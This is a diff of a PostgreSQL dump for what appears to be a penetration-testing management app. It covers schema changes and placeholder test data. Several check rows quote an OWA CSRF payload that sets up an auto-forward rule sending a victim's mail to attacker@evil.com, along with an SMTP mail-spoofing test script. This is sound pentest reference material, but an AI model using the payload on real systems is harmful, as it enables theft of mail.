@@ -4,7 +4,7 @@
 
 -- Dumped from database version 8.4.13
 -- Dumped by pg_dump version 9.1.3
--- Started on 2012-11-21 16:34:26 MSK
+-- Started on 2012-11-29 10:02:40 MSK
 
 SET statement_timeout = 0;
 SET client_encoding = 'UTF8';
@@ -205,7 +205,7 @@ ALTER SEQUENCE check_controls_id_seq OWNED BY check_controls.id;
 -- Name: check_controls_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
 --
 
-SELECT pg_catalog.setval('check_controls_id_seq', 11, true);
+SELECT pg_catalog.setval('check_controls_id_seq', 12, true);
 
 
 --
@@ -485,7 +485,7 @@ ALTER SEQUENCE checks_id_seq OWNED BY checks.id;
 -- Name: checks_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
 --
 
-SELECT pg_catalog.setval('checks_id_seq', 46, true);
+SELECT pg_catalog.setval('checks_id_seq', 47, true);
 
 
 --
@@ -885,7 +885,7 @@ ALTER SEQUENCE report_template_summary_id_seq OWNED BY report_template_summary.i
 -- Name: report_template_summary_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
 --
 
-SELECT pg_catalog.setval('report_template_summary_id_seq', 3, true);
+SELECT pg_catalog.setval('report_template_summary_id_seq', 4, true);
 
 
 --
@@ -920,7 +920,9 @@ CREATE TABLE report_templates (
     separate_category_id bigint,
     separate_vulns_intro character varying,
     vulns_intro character varying,
-    info_checks_intro character varying
+    info_checks_intro character varying,
+    security_level_intro character varying,
+    vuln_distribution_intro character varying
 );
 
 
@@ -957,7 +959,7 @@ ALTER SEQUENCE report_templates_id_seq OWNED BY report_templates.id;
 -- Name: report_templates_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
 --
 
-SELECT pg_catalog.setval('report_templates_id_seq', 2, true);
+SELECT pg_catalog.setval('report_templates_id_seq', 3, true);
 
 
 --
@@ -974,7 +976,9 @@ CREATE TABLE report_templates_l10n (
     appendix character varying,
     separate_vulns_intro character varying,
     vulns_intro character varying,
-    info_checks_intro character varying
+    info_checks_intro character varying,
+    security_level_intro character varying,
+    vuln_distribution_intro character varying
 );
 
 
@@ -1026,7 +1030,7 @@ ALTER SEQUENCE risk_categories_id_seq OWNED BY risk_categories.id;
 -- Name: risk_categories_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
 --
 
-SELECT pg_catalog.setval('risk_categories_id_seq', 18, true);
+SELECT pg_catalog.setval('risk_categories_id_seq', 19, true);
 
 
 --
@@ -1644,7 +1648,6 @@ COPY check_categories_l10n (check_category_id, language_id, name) FROM stdin;
 --
 
 COPY check_controls (id, check_category_id, name) FROM stdin;
-1	1	Default
 2	2	Default
 3	3	Default
 4	4	Default
@@ -1655,6 +1658,8 @@ COPY check_controls (id, check_category_id, name) FROM stdin;
 11	1	Empty Control
 8	1	Session Handling
 10	9	SESSION HANDLING & COOKIES
+1	1	Default
+12	11	New checks
 \.
 
 
@@ -1665,8 +1670,6 @@ COPY check_controls (id, check_category_id, name) FROM stdin;
 --
 
 COPY check_controls_l10n (check_control_id, language_id, name) FROM stdin;
-1	1	Default
-1	2	\N
 2	1	Default
 2	2	\N
 3	1	Default
@@ -1687,6 +1690,10 @@ COPY check_controls_l10n (check_control_id, language_id, name) FROM stdin;
 8	2	\N
 10	1	SESSION HANDLING & COOKIES
 10	2	\N
+1	1	Default
+1	2	zzz
+12	1	New checks
+12	2	\N
 \.
 
 
@@ -1930,8 +1937,9 @@ COPY checks (id, check_control_id, name, background_info, hints, advanced, autom
 45	1	DNS A (Non-Recursive)			f	t	dns_a_nr.py	f		\N		1			2
 6	1	DNS Hosting	hello		f	t	dns_hosting.py	f		\N		1			2
 3	1	DNS AFXR	hey <b>fuck \\' sss</b><br><b>How are you?<br></b>sd<br><b></b>1. this is some kind of list<br>2. lololo upup up<br>sdfa<br>asdf<br>asdf<br>sdd<br>sdf<br>sdf	jjj<br>what the fuck did you do?	f	t	dns_afxr.pl	f		\N	No more no more	1			2
-1	1	DNS A	blabla <a href="http://google.com">google.com</a><br><br><span>some shit</span><br><br>\r\n\r\n<a href="http://google.com" target="_blank" rel="nofollow">yay</a>.		f	t	dns_a.py	f		\N		1			2
-46	10	Scan Somethingh	<u></u>{<br>{\\fuck} {fuck} {shit}<br>Unter&nbsp;<a target="_blank" rel="nofollow" href="http://packetstormsecurity.org/files/view/85931/owa-bypass.txt">http://packetstormsecurity.org/files/view/85931/owa-bypass.txt</a>&nbsp;&nbsp;ist eine Schwachstelle beschrieben, wie man OWA Regeln umgehen kann.<br><br>Dazu muss man eine Webseite einrichten, die der Benutzer besuchen muss.<span>Der nachfolgende Code muss auf einer Webseite sein, die ein angemeldeter OWA Benutzer besucht<br><br></span>Die Webseite muss dabei einen POST request durchführen, um eine Auto-Forward Regel einzurichten: &nbsp;<br><br>POST&nbsp;<span><a target="_blank" rel="nofollow" href="https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save">https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save</a>&gt;&nbsp;</span><br><br>&lt;input type="hidden"&nbsp;<br><br><span>name='&amp;#60params&amp;#62&amp;#60Id&amp;#62&amp;#60/Id&amp;#62&amp;#60Name&amp;#62Test&amp;#60/Name&amp;#62&amp;#60RecpA4&amp;#62&amp;#60item&amp;#62&amp;#60Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"&amp;#62&amp;#60/Rcp&amp;#62&amp;#60/item&amp;#62&amp;#60/RecpA4&amp;#62&amp;#60Actions&amp;#62&amp;#60item&amp;#62&amp;#60rca t="4"&amp;#62&amp;#60/rca&amp;#62&amp;#60/item&amp;#62&amp;#60/Actions&amp;#62&amp;#60/params&amp;#62' value=""&gt; &lt;/form&gt;<br></span>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	f	t	w3af_form_autocomplete.py	f		\N	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	1			2
+1	1	DNS A	blabla <a target="_blank" rel="nofollow" href="http://google.com">google.com</a><br><br>some shit<br><br>\r\n\r\n<a target="_blank" rel="nofollow" href="http://google.com">yay</a>.		f	t	dns_a.py	f		\N		1			2
+47	12	CMS check			f	t	cms_detection.py	f	http	80		1			2
+46	10	Scan Somethingh	<u></u>{&nbsp;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,\r\nbullet point&nbsp;</span><br>{\\fuck} {fuck} {shit}<br><ul><li>uno</li><li>dos</li><ul><li>inherited</li><li>list</li></ul><li>tres</li></ul><br><ol><li>eins</li><li>zwei</li><li>drei</li><ol><li>vier</li></ol><li>whatever</li></ol>Unter&nbsp;<a target="_blank" rel="nofollow" href="http://packetstormsecurity.org/files/view/85931/owa-bypass.txt">http://packetstormsecurity.org/files/view/85931/owa-bypass.txt</a>&nbsp;&nbsp;ist eine Schwachstelle <u>beschrieben</u>, wie man OWA Regeln umgehen kann.<br>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,&nbsp;</span><br>Dazu muss man eine Webseite einrichten, die der Benutzer besuchen muss.<span>Der nachfolgende Code muss auf einer Webseite sein, die ein angemeldeter OWA Benutzer besucht<br><br></span>Die Webseite muss dabei einen POST request durchführen, um eine Auto-Forward Regel einzurichten: &nbsp;<br><br>POST&nbsp;<span><a target="_blank" rel="nofollow" href="https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save">https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save</a>&gt;&nbsp;</span><br><br>&lt;input type="hidden"&nbsp;<br><br><span>name='&amp;#60params&amp;#62&amp;#60Id&amp;#62&amp;#60/Id&amp;#62&amp;#60Name&amp;#62Test&amp;#60/Name&amp;#62&amp;#60RecpA4&amp;#62&amp;#60item&amp;#62&amp;#60Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"&amp;#62&amp;#60/Rcp&amp;#62&amp;#60/item&amp;#62&amp;#60/RecpA4&amp;#62&amp;#60Actions&amp;#62&amp;#60item&amp;#62&amp;#60rca t="4"&amp;#62&amp;#60/rca&amp;#62&amp;#60/item&amp;#62&amp;#60/Actions&amp;#62&amp;#60/params&amp;#62' value=""&gt; &lt;/form&gt;<br></span>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	f	t	w3af_form_autocomplete.py	f		\N	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	1			2
 \.
 
 
@@ -2024,10 +2032,12 @@ COPY checks_l10n (check_id, language_id, name, background_info, hints, reference
 6	2	\N	\N	\N	\N	\N
 3	1	DNS AFXR	hey <b>fuck \\' sss</b><br><b>How are you?<br></b>sd<br><b></b>1. this is some kind of list<br>2. lololo upup up<br>sdfa<br>asdf<br>asdf<br>sdd<br>sdf<br>sdf	jjj<br>what the fuck did you do?	\N	No more no more
 3	2	ZXZXZXX	meowsfvfd<br>sdfsdf<br>sdf<br>sdf<br>sd<br>f<br>sdf<br>sd<br>f<br>sd<br>f<br>sdf	piu<i> poiu</i>	\N	\N
-1	1	DNS A	blabla <a href="http://google.com">google.com</a><br><br><span>some shit</span><br><br>\r\n\r\n<a href="http://google.com" target="_blank" rel="nofollow">yay</a>.	\N	\N	\N
-1	2	\N	blabla <a href="http://google.com">google.com</a><br><br><span>some shit</span><br><br>\r\n\r\n<a href="http://google.com" target="_blank" rel="nofollow">yay</a>.	\N	\N	\N
+1	1	DNS A	blabla <a target="_blank" rel="nofollow" href="http://google.com">google.com</a><br><br>some shit<br><br>\r\n\r\n<a target="_blank" rel="nofollow" href="http://google.com">yay</a>.	\N	\N	\N
+1	2	ZZZ	blabla <a target="_blank" rel="nofollow" href="http://google.com">google.com</a><br><br>some shit<br><br>\r\n\r\n<a target="_blank" rel="nofollow" href="http://google.com">yay</a>.	\N	\N	\N
 46	2	\N	\N	\N	\N	\N
-46	1	Scan Somethingh	<u></u>{<br>{\\fuck} {fuck} {shit}<br>Unter&nbsp;<a target="_blank" rel="nofollow" href="http://packetstormsecurity.org/files/view/85931/owa-bypass.txt">http://packetstormsecurity.org/files/view/85931/owa-bypass.txt</a>&nbsp;&nbsp;ist eine Schwachstelle beschrieben, wie man OWA Regeln umgehen kann.<br><br>Dazu muss man eine Webseite einrichten, die der Benutzer besuchen muss.<span>Der nachfolgende Code muss auf einer Webseite sein, die ein angemeldeter OWA Benutzer besucht<br><br></span>Die Webseite muss dabei einen POST request durchführen, um eine Auto-Forward Regel einzurichten: &nbsp;<br><br>POST&nbsp;<span><a target="_blank" rel="nofollow" href="https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save">https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save</a>&gt;&nbsp;</span><br><br>&lt;input type="hidden"&nbsp;<br><br><span>name='&amp;#60params&amp;#62&amp;#60Id&amp;#62&amp;#60/Id&amp;#62&amp;#60Name&amp;#62Test&amp;#60/Name&amp;#62&amp;#60RecpA4&amp;#62&amp;#60item&amp;#62&amp;#60Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"&amp;#62&amp;#60/Rcp&amp;#62&amp;#60/item&amp;#62&amp;#60/RecpA4&amp;#62&amp;#60Actions&amp;#62&amp;#60item&amp;#62&amp;#60rca t="4"&amp;#62&amp;#60/rca&amp;#62&amp;#60/item&amp;#62&amp;#60/Actions&amp;#62&amp;#60/params&amp;#62' value=""&gt; &lt;/form&gt;<br></span>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	\N	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>
+46	1	Scan Somethingh	<u></u>{&nbsp;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,\r\nbullet point&nbsp;</span><br>{\\fuck} {fuck} {shit}<br><ul><li>uno</li><li>dos</li><ul><li>inherited</li><li>list</li></ul><li>tres</li></ul><br><ol><li>eins</li><li>zwei</li><li>drei</li><ol><li>vier</li></ol><li>whatever</li></ol>Unter&nbsp;<a target="_blank" rel="nofollow" href="http://packetstormsecurity.org/files/view/85931/owa-bypass.txt">http://packetstormsecurity.org/files/view/85931/owa-bypass.txt</a>&nbsp;&nbsp;ist eine Schwachstelle <u>beschrieben</u>, wie man OWA Regeln umgehen kann.<br>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,&nbsp;</span><br>Dazu muss man eine Webseite einrichten, die der Benutzer besuchen muss.<span>Der nachfolgende Code muss auf einer Webseite sein, die ein angemeldeter OWA Benutzer besucht<br><br></span>Die Webseite muss dabei einen POST request durchführen, um eine Auto-Forward Regel einzurichten: &nbsp;<br><br>POST&nbsp;<span><a target="_blank" rel="nofollow" href="https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save">https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save</a>&gt;&nbsp;</span><br><br>&lt;input type="hidden"&nbsp;<br><br><span>name='&amp;#60params&amp;#62&amp;#60Id&amp;#62&amp;#60/Id&amp;#62&amp;#60Name&amp;#62Test&amp;#60/Name&amp;#62&amp;#60RecpA4&amp;#62&amp;#60item&amp;#62&amp;#60Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"&amp;#62&amp;#60/Rcp&amp;#62&amp;#60/item&amp;#62&amp;#60/RecpA4&amp;#62&amp;#60Actions&amp;#62&amp;#60item&amp;#62&amp;#60rca t="4"&amp;#62&amp;#60/rca&amp;#62&amp;#60/item&amp;#62&amp;#60/Actions&amp;#62&amp;#60/params&amp;#62' value=""&gt; &lt;/form&gt;<br></span>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	\N	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>
+47	1	CMS check	\N	\N	\N	\N
+47	2	\N	\N	\N	\N	\N
 \.
 
 
@@ -2103,7 +2113,6 @@ COPY projects (id, client_id, year, deadline, name, status, vuln_overdue) FROM s
 6	1	2012	2012-09-21	aaa	in_progress	\N
 3	1	2012	2012-09-21	xxx	open	\N
 4	2	2012	2012-09-21	yyy	open	\N
-7	2	2012	2012-09-21	bbb	open	\N
 8	2	2012	2012-09-21	ccc	open	\N
 9	2	2012	2012-09-21	fff	open	\N
 10	1	2012	2012-09-21	ddd	open	\N
@@ -2133,6 +2142,7 @@ COPY "references" (id, name, url) FROM stdin;
 
 COPY report_template_summary (id, summary, rating_from, rating_to, report_template_id, title) FROM stdin;
 3	The general security state of the infrastructure is rated with a “{rating}”: low to medium critical”. This is a cumulative value that reflects the overall security\r\nstatus. Only a few problems can cause a severe impact. Therefore this value is\r\ndriven mainly by the vulnerabilities within a few devices.<br><br>Some of the vulnerabilities are critical. But none of them would help an\r\nattacker to immediately take over a system. Client "{client}" still has to be aware that this is only\r\na snapshot of the current situation. Any change in the future (like new\r\nexploits available for a specific system) could change the situation.&nbsp;	0.00	5.00	1	Everything is fine!
+4		1.00	2.00	1	Hello
 \.
 
 
@@ -2145,6 +2155,8 @@ COPY report_template_summary (id, summary, rating_from, rating_to, report_templa
 COPY report_template_summary_l10n (report_template_summary_id, language_id, summary, title) FROM stdin;
 3	1	The general security state of the infrastructure is rated with a “{rating}”: low to medium critical”. This is a cumulative value that reflects the overall security\r\nstatus. Only a few problems can cause a severe impact. Therefore this value is\r\ndriven mainly by the vulnerabilities within a few devices.<br><br>Some of the vulnerabilities are critical. But none of them would help an\r\nattacker to immediately take over a system. Client "{client}" still has to be aware that this is only\r\na snapshot of the current situation. Any change in the future (like new\r\nexploits available for a specific system) could change the situation.&nbsp;	Everything is fine!
 3	2	\N	\N
+4	1	\N	Hello
+4	2	\N	\N
 \.
 
 
@@ -2154,8 +2166,9 @@ COPY report_template_summary_l10n (report_template_summary_id, language_id, summ
 -- Data for Name: report_templates; Type: TABLE DATA; Schema: public; Owner: gtta
 --
 
-COPY report_templates (id, name, header_image_path, header_image_type, intro, appendix, separate_category_id, separate_vulns_intro, vulns_intro, info_checks_intro) FROM stdin;
-1	Test Template	0caf7534e0fee7a603c2948652ab8de6815ccea0b277340d7122269f4a847c89	image/png	Test Template Intro<br>The client is: {client}<br>The project is: {project}<br>Project year:&nbsp;<b>{year}<br></b>Project deadline: {deadline}<br>Project admin: {admin}<br>Project rating: {rating}<br>Date from: {date.from}<br>Date to: {date.to}<br>Targets: {targets}<br><br><b>Here's a list of targets:</b><br>{target.list}This text goes after the list of targets.<br><b>well done<br><br></b>number of checks: {checks} (info: {checks.info}, low: {checks.lo}, med: {checks.med}, high: {checks.hi})<br><b><br></b>{check.list}<b><br></b>well done	Test Template Appendix	1	Hello	World	Info Checks go here ;)
+COPY report_templates (id, name, header_image_path, header_image_type, intro, appendix, separate_category_id, separate_vulns_intro, vulns_intro, info_checks_intro, security_level_intro, vuln_distribution_intro) FROM stdin;
+3	Yay ;)	\N	\N			0				\N	\N
+1	Test Template	0caf7534e0fee7a603c2948652ab8de6815ccea0b277340d7122269f4a847c89	image/png	Test Template Intro<br>The client is: {client}<br>The project is: {project}<br>Project year:&nbsp;<b>{year}<br></b>Project deadline: {deadline}<br>Project admin: {admin}<br>Project rating: {rating}<br>Date from: {date.from}<br>Date to: {date.to}<br>Targets: {targets}<br><br><b>Here's a list of targets:</b><br>{target.list}This text goes after the list of targets.<br><b>well done<br><br></b>number of checks: {checks} (info: {checks.info}, low: {checks.lo}, med: {checks.med}, high: {checks.hi})<br><b><br></b>{check.list}<b><br></b>well done	Test Template Appendix	0	Hello {client}	World&nbsp;{client}	Info Checks go here ;)&nbsp;{client}	test one two {targets}	test one two&nbsp;{targets}
 \.
 
 
@@ -2165,9 +2178,11 @@ COPY report_templates (id, name, header_image_path, header_image_type, intro, ap
 -- Data for Name: report_templates_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
 --
 
-COPY report_templates_l10n (report_template_id, language_id, name, intro, appendix, separate_vulns_intro, vulns_intro, info_checks_intro) FROM stdin;
-1	2	Testen Templaten	Testen Templaten Intro	Testen Templaten Appendix	Helloy	Worlda	\N
-1	1	Test Template	Test Template Intro<br>The client is: {client}<br>The project is: {project}<br>Project year:&nbsp;<b>{year}<br></b>Project deadline: {deadline}<br>Project admin: {admin}<br>Project rating: {rating}<br>Date from: {date.from}<br>Date to: {date.to}<br>Targets: {targets}<br><br><b>Here's a list of targets:</b><br>{target.list}This text goes after the list of targets.<br><b>well done<br><br></b>number of checks: {checks} (info: {checks.info}, low: {checks.lo}, med: {checks.med}, high: {checks.hi})<br><b><br></b>{check.list}<b><br></b>well done	Test Template Appendix	Hello	World	Info Checks go here ;)
+COPY report_templates_l10n (report_template_id, language_id, name, intro, appendix, separate_vulns_intro, vulns_intro, info_checks_intro, security_level_intro, vuln_distribution_intro) FROM stdin;
+3	1	Yay ;)	\N	\N	\N	\N	\N	\N	\N
+3	2	\N	\N	\N	\N	\N	\N	\N	\N
+1	1	Test Template	Test Template Intro<br>The client is: {client}<br>The project is: {project}<br>Project year:&nbsp;<b>{year}<br></b>Project deadline: {deadline}<br>Project admin: {admin}<br>Project rating: {rating}<br>Date from: {date.from}<br>Date to: {date.to}<br>Targets: {targets}<br><br><b>Here's a list of targets:</b><br>{target.list}This text goes after the list of targets.<br><b>well done<br><br></b>number of checks: {checks} (info: {checks.info}, low: {checks.lo}, med: {checks.med}, high: {checks.hi})<br><b><br></b>{check.list}<b><br></b>well done	Test Template Appendix	Hello {client}	World&nbsp;{client}	Info Checks go here ;)&nbsp;{client}	test one two {targets}	test one two&nbsp;{targets}
+1	2	zzz	Testen Templaten Intro	Testen Templaten Appendix	Helloy	Worlda	\N	test eins zwei&nbsp;{targets}	test eins zwei&nbsp;{targets}
 \.
 
 
@@ -2181,6 +2196,7 @@ COPY risk_categories (id, name, risk_template_id) FROM stdin;
 16	Fluger geheimer	3
 17	Cat 1	4
 18	cat 2	4
+19	ZZZz	3
 \.
 
 
@@ -2197,6 +2213,8 @@ COPY risk_categories_l10n (risk_category_id, language_id, name) FROM stdin;
 17	2	\N
 18	1	cat 2
 18	2	\N
+19	1	ZZZz
+19	2	AAAA
 \.
 
 
@@ -2333,6 +2351,49 @@ COPY risk_category_checks (risk_category_id, check_id, damage, likelihood) FROM 
 18	6	1	1
